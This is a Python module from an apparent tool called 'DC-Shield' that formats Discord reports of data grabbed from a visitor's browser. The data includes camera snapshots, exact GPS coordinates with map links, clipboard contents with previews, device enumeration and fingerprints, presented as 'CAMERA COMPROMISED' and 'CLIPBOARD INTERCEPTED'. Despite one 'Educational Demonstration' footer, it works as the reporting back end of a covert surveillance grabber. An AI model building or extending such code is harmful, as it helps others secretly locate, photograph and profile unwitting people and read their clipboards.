"""
Advanced Discord Embed Functions for DC-Shield
Provides enhanced surveillance reporting with improved visuals and comprehensive data analysis
"""

def create_progress_bar(percentage, length=10):
    """Create a visual progress bar using Discord-compatible characters"""
    filled = int(length * percentage / 100)
    empty = length - filled
    bar = "█" * filled + "░" * empty
    return f"`{bar}` {percentage}%"

def format_bytes(bytes_value):
    """Format bytes into human readable format"""
    if not bytes_value or bytes_value == 0:
        return "0 B"

    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_value < 1024.0:
            return f"{bytes_value:.1f} {unit}"
        bytes_value /= 1024.0
    return f"{bytes_value:.1f} PB"

def get_threat_indicator(score):
    """Get threat level indicator with emoji and color coding"""
    if score >= 80:
        return "🔴 **CRITICAL**", 0xff0000
    elif score >= 60:
        return "🟠 **HIGH**", 0xff6b35
    elif score >= 40:
        return "🟡 **MODERATE**", 0xffa500
    elif score >= 20:
        return "🟢 **LOW**", 0x32cd32
    else:
        return "🔵 **MINIMAL**", 0x007bff

def create_combined_surveillance_embed(data):
    """
    Create a comprehensive embed combining all surveillance data with enhanced visuals
    """
    from datetime import datetime

    # Calculate comprehensive metrics
    categories_captured = 0
    total_categories = 15  # Increased for more categories
    critical_data_found = False

    # Enhanced category tracking
    captured_categories = []

    def is_valid_dict_with_no_error(obj):
        return isinstance(obj, dict) and not obj.get('error')

    if data.get('screen'):
        categories_captured += 1
        captured_categories.append("Display")
    if is_valid_dict_with_no_error(data.get('geolocation')):
        categories_captured += 1
        captured_categories.append("GPS Location")
        critical_data_found = True
    if data.get('camera', {}).get('captured'):
        categories_captured += 1
        captured_categories.append("Camera Access")
        critical_data_found = True
    if is_valid_dict_with_no_error(data.get('battery')):
        categories_captured += 1
        captured_categories.append("Battery")
    if isinstance(data.get('mediaDevices'), list):
        categories_captured += 1
        captured_categories.append("Media Devices")
    elif data.get('mediaDevices') and not isinstance(data.get('mediaDevices'), list) and not data['mediaDevices'].get('error'):
        categories_captured += 1
        captured_categories.append("Media Devices")
    if is_valid_dict_with_no_error(data.get('network')):
        categories_captured += 1
        captured_categories.append("Network")
    if is_valid_dict_with_no_error(data.get('storage')):
        categories_captured += 1
        captured_categories.append("Storage")
    if is_valid_dict_with_no_error(data.get('clipboard')):
        categories_captured += 1
        captured_categories.append("Clipboard")
        critical_data_found = True
    if data.get('canvas'):
        categories_captured += 1
        captured_categories.append("Canvas Fingerprint")
    if is_valid_dict_with_no_error(data.get('webgl')):
        categories_captured += 1
        captured_categories.append("WebGL Fingerprint")
    if data.get('memory'):
        categories_captured += 1
        captured_categories.append("Memory Profile")
    if data.get('timezone'):
        categories_captured += 1
        captured_categories.append("Timezone")
    if data.get('viewport'):
        categories_captured += 1
        captured_categories.append("Viewport")
    if data.get('browser'):
        categories_captured += 1
        captured_categories.append("Browser Profile")
    if data.get('localStorage'):
        categories_captured += 1
        captured_categories.append("Local Storage")

    success_rate = int((categories_captured/total_categories)*100)
    threat_level, embed_color = get_threat_indicator(success_rate)

    embed = {
        "title": "🎯 ADVANCED DIGITAL FORENSICS REPORT",
        "description": f"**{threat_level} SURVEILLANCE ANALYSIS**\n" +
                      f"{'🚨 **SENSITIVE DATA COMPROMISED**' if critical_data_found else '📊 **SYSTEM PROFILING COMPLETE**'}",
        "color": embed_color,
        "timestamp": datetime.now().isoformat(),
        "fields": [],
        "footer": {
            "text": f"DC-Shield Intelligence System • {categories_captured} categories analyzed",
            "icon_url": "https://cdn.discordapp.com/attachments/123456789/shield-icon.png"
        }
    }

    # Enhanced Overview with Progress Bar
    overview_value = f"**Data Collection Success Rate**\n"
    overview_value += f"{create_progress_bar(success_rate)}\n\n"
    overview_value += f"**Categories Captured:** {categories_captured}/{total_categories}\n"
    overview_value += f"**Threat Assessment:** {threat_level}\n"
    overview_value += f"**Analysis Status:** {'⚠️ Critical Data Found' if critical_data_found else '✅ Standard Profiling'}"

    embed["fields"].append({
        "name": "📊 SURVEILLANCE OVERVIEW",
        "value": overview_value,
        "inline": False
    })

    # Critical Security Alerts with Enhanced Details
    critical_alerts = []

    if data.get('camera', {}).get('captured'):
        timestamp = data['camera'].get('timestamp', 'Unknown')
        critical_alerts.append(f"📸 **CAMERA COMPROMISED**\n└ Image captured at {timestamp}\n└ Resolution: 640x480px")

    if is_valid_dict_with_no_error(data.get('geolocation')) and data['geolocation'].get('latitude'):
        lat, lng = data['geolocation'].get('latitude'), data['geolocation'].get('longitude')
        accuracy = data['geolocation'].get('accuracy', 'Unknown')
        critical_alerts.append(f"🌍 **PRECISE LOCATION ACQUIRED**\n└ Coordinates: `{lat:.6f}, {lng:.6f}`\n└ Accuracy: ±{accuracy}m")

    # Critical alerts
    if is_valid_dict_with_no_error(data.get('clipboard')):
        clip_len = data['clipboard'].get('length', 0)
        preview = data['clipboard'].get('content', '')[:30]
        critical_alerts.append(f"📋 **CLIPBOARD INTERCEPTED**\n└ Content length: {clip_len} characters\n└ Preview: `{preview}...`")

    if isinstance(data.get('mediaDevices'), list):
        devices = data['mediaDevices']
        cam_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'videoinput')
        mic_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'audioinput')
        speaker_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'audiooutput')
        critical_alerts.append(f"🎥 **MEDIA DEVICES ENUMERATED**\n└ Cameras: {cam_count} | Microphones: {mic_count}\n└ Speakers: {speaker_count}")
    elif data.get('mediaDevices') and not isinstance(data.get('mediaDevices'), list) and not data['mediaDevices'].get('error'):
        devices = data['mediaDevices']
        cam_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'videoinput') if isinstance(devices, list) else 0
        mic_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'audioinput') if isinstance(devices, list) else 0
        speaker_count = sum(1 for d in devices if isinstance(d, dict) and d.get('kind') == 'audiooutput') if isinstance(devices, list) else 0
        critical_alerts.append(f"🎥 **MEDIA DEVICES ENUMERATED**\n└ Cameras: {cam_count} | Microphones: {mic_count}\n└ Speakers: {speaker_count}")

    if critical_alerts:
        embed["fields"].append({
            "name": "🚨 CRITICAL SECURITY ALERTS",
            "value": "\n\n".join(critical_alerts),
            "inline": False
        })

    # Enhanced System Profile with Better Organization
    system_profile_left = []
    system_profile_right = []

    if data.get('screen'):
        screen = data['screen']
        total_pixels = screen.get('width', 0) * screen.get('height', 0)
        system_profile_left.append(f"🖥️ **Display**\n└ {screen.get('width')}×{screen.get('height')} ({total_pixels:,} pixels)")
        system_profile_left.append(f"└ Color depth: {screen.get('colorDepth', 'Unknown')} bits")

    if data.get('browser', {}).get('hardwareConcurrency'):
        cores = data['browser']['hardwareConcurrency']
        system_profile_right.append(f"⚙️ **CPU**\n└ {cores} logical cores")

    if data.get('deviceMemory'):
        ram_gb = data['deviceMemory']
        system_profile_right.append(f"💾 **RAM**\n└ {ram_gb} GB total")

    if data.get('memory'):
        memory = data['memory']
        heap_used = format_bytes(memory.get('usedJSHeapSize', 0))
        heap_limit = format_bytes(memory.get('jsHeapSizeLimit', 0))
        system_profile_left.append(f"🧠 **JS Memory**\n└ {heap_used} / {heap_limit}")

    if data.get('timezone'):
        tz = data['timezone']
        offset_hours = tz.get('offset', 0) / -60
        system_profile_right.append(f"🌐 **Location**\n└ {tz.get('name', 'Unknown')}")
        system_profile_right.append(f"└ UTC{offset_hours:+.1f}")

    if is_valid_dict_with_no_error(data.get('battery')):
        battery = data['battery']
        level = int(battery.get('level', 0) * 100)
        status = "🔌 Charging" if battery.get('charging') else "🔋 Discharging"
        system_profile_left.append(f"🔋 **Battery**\n└ {level}% {status}")

    if is_valid_dict_with_no_error(data.get('network')):
        network = data['network']
        speed_info = f"{network.get('downlink', 'Unknown')} Mbps"
        latency_info = f"{network.get('rtt', 'Unknown')}ms RTT"
        system_profile_right.append(f"📡 **Network**\n└ {network.get('effectiveType', 'Unknown')} ({speed_info})")
        system_profile_right.append(f"└ Latency: {latency_info}")

    if system_profile_left:
        embed["fields"].append({
            "name": "💻 SYSTEM PROFILE (Hardware)",
            "value": "\n\n".join(system_profile_left),
            "inline": True
        })

    if system_profile_right:
        embed["fields"].append({
            "name": "🌐 SYSTEM PROFILE (Network)",
            "value": "\n\n".join(system_profile_right),
            "inline": True
        })

    # Enhanced Security Risk Assessment
    security_score = 0
    risk_factors = []

    if data.get('camera', {}).get('captured'):
        security_score += 35
        risk_factors.append("Camera access granted")

    if is_valid_dict_with_no_error(data.get('geolocation')) and data['geolocation'].get('latitude'):
        security_score += 30
        risk_factors.append("GPS location exposed")

    if is_valid_dict_with_no_error(data.get('clipboard')):
        security_score += 25
        risk_factors.append("Clipboard data accessed")

    if isinstance(data.get('mediaDevices'), list):
        security_score += 20
        risk_factors.append("Media devices enumerated")
    elif data.get('mediaDevices') and not isinstance(data.get('mediaDevices'), list) and not data['mediaDevices'].get('error'):
        security_score += 20
        risk_factors.append("Media devices enumerated")

    if data.get('canvas') or (is_valid_dict_with_no_error(data.get('webgl')) and not data['webgl'].get('error')):
        security_score += 15
        risk_factors.append("Device fingerprinting active")

    if is_valid_dict_with_no_error(data.get('storage')):
        security_score += 10
        risk_factors.append("Storage information gathered")

    # Cap at 100
    security_score = min(security_score, 100)
    risk_level, _ = get_threat_indicator(security_score)

    security_value = f"**Risk Assessment**\n{create_progress_bar(security_score)}\n\n"
    security_value += f"**Threat Level:** {risk_level}\n"
    security_value += f"**Risk Factors:** {len(risk_factors)} identified\n"
    if risk_factors:
        security_value += f"**Primary Concerns:**\n" + "\n".join([f"• {factor}" for factor in risk_factors[:3]])

    embed["fields"].append({
        "name": "🛡️ SECURITY RISK ANALYSIS",
        "value": security_value,
        "inline": False
    })

    # Captured Data Summary
    if captured_categories:
        summary_value = f"**Successfully Captured ({len(captured_categories)} categories):**\n"
        # Group categories into rows of 3 for better formatting
        for i in range(0, len(captured_categories), 3):
            row = captured_categories[i:i+3]
            summary_value += "• " + " • ".join(row) + "\n"

        embed["fields"].append({
            "name": "📋 DATA COLLECTION SUMMARY",
            "value": summary_value,
            "inline": False
        })

    return embed

def create_detailed_category_embed(data, category):
    """
    Create detailed embed for specific data category
    """
    from datetime import datetime

    category_configs = {
        "camera": {
            "title": "📸 CAMERA SURVEILLANCE DETAILS",
            "color": 0xff0000,
            "icon": "📷"
        },
        "location": {
            "title": "🌍 GPS LOCATION INTELLIGENCE",
            "color": 0xe74c3c,
            "icon": "📍"
        },
        "hardware": {
            "title": "⚙️ HARDWARE PROFILE ANALYSIS",
            "color": 0x3498db,
            "icon": "🔧"
        },
        "network": {
            "title": "📡 NETWORK INTELLIGENCE REPORT",
            "color": 0x9b59b6,
            "icon": "🌐"
        },
        "fingerprint": {
            "title": "🎨 DEVICE FINGERPRINT ANALYSIS",
            "color": 0xe67e22,
            "icon": "🔍"
        }
    }

    config = category_configs.get(category, {
        "title": "📊 DETAILED DATA ANALYSIS",
        "color": 0x95a5a6,
        "icon": "📋"
    })

    embed = {
        "title": config["title"],
        "description": f"**Comprehensive analysis of {category} data**",
        "color": config["color"],
        "timestamp": datetime.now().isoformat(),
        "fields": [],
        "footer": {
            "text": f"DC-Shield {category.title()} Intelligence • Educational Demonstration",
            "icon_url": "https://cdn.discordapp.com/attachments/123456789/shield-icon.png"
        }
    }

    # Category-specific detailed fields
    if category == "camera" and data.get('camera', {}).get('captured'):
        camera_data = data['camera']
        embed["fields"].extend([
            {
                "name": "📷 Capture Information",
                "value": f"**Status:** ✅ Successfully captured\n**Timestamp:** {camera_data.get('timestamp')}\n**Resolution:** 640×480 pixels\n**Format:** JPEG (Base64 encoded)",
                "inline": False
            },
            {
                "name": "🔍 Technical Details",
                "value": f"**Encoding Quality:** 80%\n**Estimated Size:** ~50-100KB\n**Color Space:** RGB\n**Compression:** JPEG standard",
                "inline": True
            },
            {
                "name": "⚠️ Privacy Impact",
                "value": f"**Sensitivity Level:** 🔴 Critical\n**Data Type:** Visual biometric\n**Reversibility:** Permanent capture\n**Mitigation:** Camera permissions",
                "inline": True
            }
        ])

    elif category == "location" and data.get('geolocation', {}).get('latitude'):
        geo_data = data['geolocation']
        lat, lng = geo_data.get('latitude'), geo_data.get('longitude')

        embed["fields"].extend([
            {
                "name": "📍 Precise Coordinates",
                "value": f"**Latitude:** {lat:.8f}°\n**Longitude:** {lng:.8f}°\n**Accuracy:** ±{geo_data.get('accuracy', 'Unknown')} meters",
                "inline": True
            },
            {
                "name": "🗺️ Additional Data",
                "value": f"**Altitude:** {geo_data.get('altitude') or 'Unknown'} m\n**Heading:** {geo_data.get('heading') or 'Unknown'}°\n**Speed:** {geo_data.get('speed') or 'Unknown'} m/s",
                "inline": True
            },
            {
                "name": "🔗 External Resources",
                "value": f"[📍 Google Maps](https://www.google.com/maps?q={lat},{lng})\n[🌍 OpenStreetMap](https://www.openstreetmap.org/?mlat={lat}&mlon={lng})\n[📊 GPS Visualizer](http://www.gpsvisualizer.com/)",
                "inline": False
            }
        ])

    return embed
